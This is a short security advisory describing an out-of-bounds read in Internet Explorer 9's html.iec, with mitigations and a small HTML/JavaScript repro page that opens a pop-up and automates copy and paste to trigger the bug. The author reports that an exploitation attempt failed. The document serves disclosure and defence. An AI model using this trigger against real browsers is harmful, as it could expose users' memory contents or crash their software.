1505C - MSIE 9 html.iec PxchFindXch OOB read
=====================================

Synopsis
--------
Pasting RTF data may cause an out-of-bounds read in html.iec.

Known affected software and attack vectors
------------------------------------------
  + Microsoft Internet Explorer 9

    An attacker would need to get a target user to open a specially crafted
    webpage, probably allow a pop-up to open and copy+paste data manually, or
    allow programmatic clipboard access.
    Disabling JavaScript should prevent an attacker from exploiting the issue.
    A pop-up blocker may be able to prevent an attacker from triggering the
    vulnerable code path. Disallowing programmatic clipboard access prevents an
    attacker from automating parts of the attack.

Repro
-----
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <script>
      var oWindow = window.open("target.xhtml");
      (function () {
        if (oWindow.document.getElementsByTagName("base").length) {
          oWindow.document.execCommand("SelectAll");
          oWindow.document.execCommand("Copy");
          oWindow.document.execCommand("Paste");
        } else {
          setTimeout(arguments.callee);
        };
      })();
    </script>
  </head>
</html>

target.xhtml:
<base href="x">

Description
-----------
When copying HTML to the clipboard, it is apparently converted to RTF. When
pasting from the clipboard, the RTF is converted back to HTML. If the RTF/HTML
contains a "base" element with a "href" attribute, the code looks for a double
quote (") char in the string value of the "href" attribute using the PxchFindXch
function in html.iec. This function expects to be searching a NULL terminated
Unicode string, but the string provided is not NULL terminated. This causes the
code to read beyond the end of the string.

Exploit
-------
I've attempted to exploit the issue by changing the designMode property of the
document before pasting, but was unable to add the "base" element to a document
in order to read the "href" property and disclose out-of-bounds information.
I'm not sure why pasting does not appear to work as expected and did not
investigate further.
